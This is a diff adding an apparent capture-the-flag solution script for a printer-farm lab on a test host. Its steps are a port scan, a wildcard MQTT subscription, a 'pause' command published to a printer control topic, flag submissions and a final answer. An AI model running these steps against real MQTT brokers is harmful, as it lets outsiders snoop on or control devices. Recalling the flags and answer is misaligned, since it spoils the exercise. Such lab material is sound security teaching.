@@ -1,0 +1,7 @@
+# The printer farm: the shortest path, replayed by CI in every language.
+nmap ferme.atelier-pixel.test
+mqtt sub -h ferme.atelier-pixel.test -t "#"
+submit FLAG{pixel-farm-retained-5a90}
+mqtt pub -h ferme.atelier-pixel.test -t pixel/banc/cmd -m pause
+submit FLAG{pixel-anyone-commands-c41d}
+answer acl
